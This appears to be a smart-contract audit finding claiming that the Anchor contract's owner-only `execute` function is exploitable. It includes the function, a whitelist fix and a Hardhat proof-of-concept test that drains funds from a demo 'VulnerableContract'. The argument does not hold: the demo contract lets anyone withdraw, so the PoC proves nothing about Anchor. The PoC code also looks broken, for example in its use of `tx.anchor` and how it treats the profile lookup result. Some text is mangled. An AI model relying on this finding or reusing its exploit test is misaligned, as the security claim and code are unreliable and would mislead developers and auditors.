# Unrestricted arbitrary calls via `execute` function opens up risk of exploitation pathways for profile owners

The `Anchor` contract contains an `execute` function that allows the owner of a profile to make arbitrary calls to any address. This design can lead to unexpected consequences or abuses if not handled with caution.

The `contract is equipped with a function named `execute`. Here's a breakdown:

* **Registry interaction**: The `Anchor` contract communicates with the `Registry` contract to validate profile ownership. 

* **Profile ownership**: Only the owner of a profile can invoke the `execute` function. The function checks ownership through the `registry.isOwnerOfProfile()` method.

* **Target address**: The function ensures the `_target` isn't the zero address.

* **Arbitrary calls**: Using the Solidity `call` method, it sends `_value` amount of ether and `_data` to the `_target`. If this call is unsuccessful, it reverts the transaction.

## Vulnerability Detail

The `execute` function in the `Anchor` contract, as defined below:

```solidity
function execute(address _target, uint256 _value, bytes memory _data) external returns (bytes memory) {
  if (!registry.isOwnerOfProfile(profileId, msg.sender)) revert UNAUTHORIZED();
  if (_target == address(0)) revert CALL_FAILED();
  (bool success, bytes memory data) = _target.call{value: _value}(_data);
  if (!success) revert CALL_FAILED();
  return data;
}
```

This function allows an arbitrary call to any address `_target` with any data `_data` and any ETH value `_value`, as long as the caller is the owner of the profile. There are possible risks associated with allowing such arbitrary calls, especially if the target address is a contract.

> The `Registry` contract, on the other hand, has mechanisms like `updateProfilePendingOwner` and `acceptProfileOwnership` to update the profile owner. Worth to note that these methods don't invalidate the vulnerability but simply represent a legitimate way of transferring ownership. The key point is that the execute function is dangerous when the attacker becomes the `isOwnerOfProfile`, **no matter how that ownership was acquired**, though as long as an attacker become an owner of any profile (by whatever means).

## Impact

An attacker, if he/she becomes the owner of a profile, could:

1. Interact with any contract with the privileges of the Anchor contract.
2. Drain funds from any vulnerable contract.
3. Trigger unwanted side effects in other contracts.
4. Interact with contracts in unexpected ways which the developers might not have foreseen.

- The attacker becomes the owner of a profile. How they do it is not under scrutiny hereâ€”it could be through normal functionality of the Registry contract (`createProfile)`.

- Once they are the owner, they are allowed to call execute with arbitrary `_target` and `_data`, using the privileges of the Anchor contract. This is the point where the vulnerability becomes exploitable.

## Code Snippet

```solidity
function execute(address _target, uint256 _value, bytes memory _data) external returns (bytes memory) {
  if (!registry.isOwnerOfProfile(profileId, msg.sender)) revert UNAUTHORIZED();
  if (_target == address(0)) revert CALL_FAILED();
  (bool success, bytes memory data) = _target.call{value: _value}(_data);
  if (!success) revert CALL_FAILED();
  return data;
}
```

## Tool used

Manual review.

## Recommendation

1. **Restrict arbitrary calls**: Instead of enabling any arbitrary function calls via the `execute` function, it's safer to use a whitelist mechanism or a proxy design that curbs unintended interactions.
2. **Enhance access control**: Incorporate advanced access controls like multi-signature requirements, time-locked actions, or multifactor authentication.
3. **Rigorous `_target` testing**: Before considering a contract as a pending `_target` for the `execute` function, ensure it undergoes thorough testing and code review.

> For an example modification to the `execute` function using a whitelist:

```solidity
// ... other parts of the Anchor contract ...

address[] public whitelistedAddresses; // Addresses that are allowed to be called through execute

function setWhitelistedAddress(address[] memory _addresses) external onlyOwner {
    whitelistedAddresses = _addresses;
}

function isWhitelisted(address _address) public view returns (bool) {
    for (uint i = 0; i < whitelistedAddresses.length; i++) {
        if (whitelistedAddresses[i] == _address) {
            return true;
        }
    }
    return false;
}

function execute(address _target, uint256 _value, bytes memory _data) external returns (bytes memory) {

    if (!registry.isOwnerOfProfile(profileId, msg.sender)) revert UNAUTHORIZED();
    if (_target == address(0) || !isWhitelisted(_target)) revert CALL_FAILED();

    (bool success, bytes memory data) = _target.call{value: _value}(_data);
    if (!success) revert CALL_FAILED();

    return data;
}
```

In the updated code, we've added a whitelist mechanism. Only addresses that are explicitly whitelisted can be called through the `execute` function. This minimizes the possible attack surface.

## POC

The primary concern here is that any profile owner can arbitrarily interact with other contracts. This is especially alarming if the contract holds funds or has critical logic operations.

1. **Setup**: Deploy the `Registry` and `Anchor` contracts.
2. **Become an owner**: Use the `createProfile` function of the `Registry` to become an owner.
3. **Exploit**: Utilize the `execute` function of the `Anchor` contract to make an arbitrary call, effectively altering its state or misappropriating its funds.

For instance, consider a vulnerable CA named `VulnerableContract` which has a fund storage mechanism and a function to alter its state.

```solidity
contract VulnerableContract {
    uint256 public data;
    uint256 public funds;

    function setData(uint256 _data) external {
        data = _data;
    }

    function withdrawFunds(uint256 amount) external {
        require(funds >= amount, "Not enough funds");
        funds -= amount;
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {
        funds += msg.value;
    }
}
```

An attacker, after owning a profile, can target this `VulnerableContract` using the `execute` function and can either change the `data` state or even worse, withdraw funds without having any direct interaction with the `VulnerableContract`.

> Consequently, for the attacker to exploit this:

```javascript
const { ethers, waffle } = require("hardhat");
const { expect } = require("chai");

describe("Exploit", function () {
  let owner, attacker;
  let registry, anchor, vulnerable;
  let profileId;

  before(async function () {
    [owner, attacker] = await ethers.getSigners();

    // 1. Deploy Registry
    const Registry = await ethers.getContractFactory("Registry");
    registry = await Registry.deploy();
    await registry.deployed();
    await registry.initialize(owner.address);

    // 2. Deploy Anchor using the deployed Registry address
    // Note: Assuming Anchor accepts a registry address as a constructor parameter
    const Anchor = await ethers.getContractFactory("Anchor");
    anchor = await Anchor.deploy(registry.address);

    // 3. Deploy VulnerableContract and deposit some funds
    const VulnerableContract = await ethers.getContractFactory("VulnerableContract");
    vulnerable = await VulnerableContract.deploy();
    await vulnerable.deployed();
    await owner.sendTransaction({ to: vulnerable.address, value: ethers.utils.parseEther("1") });  // Depositing 1 ether
  });

  it("Create profile and become owner", async function () {
    const tx = await registry.createProfile(1, "Attacker", { key: "value" }, attacker.address, []);
    await tx.wait();

    profileId = await registry.getProfileByAnchor(tx.anchor); // tx.anchor is the profileId
    expect(profileId.owner).to.equal(attacker.address);
  });

  it("Exploit VulnerableContract to withdraw funds", async function () {
    const withdrawalAmount = ethers.utils.parseEther("1");  // Attempting to withdraw all funds
    const callData = vulnerable.interface.encodeFunctionData("withdrawFunds", [withdrawalAmount]);

    await anchor.connect(attacker).execute(vulnerable.address, 0, callData);

    expect(await vulnerable.funds()).to.equal(0);  // The funds in the vulnerable contract should now be 0
  });
});
```

This PoC demonstrates how the `execute` function can be an actual risk. By allowing arbitrary calls with the privileges of the `Anchor` contract, it can be eventually abused, leading to loss of funds or alteration of critical state variables in other CAs.
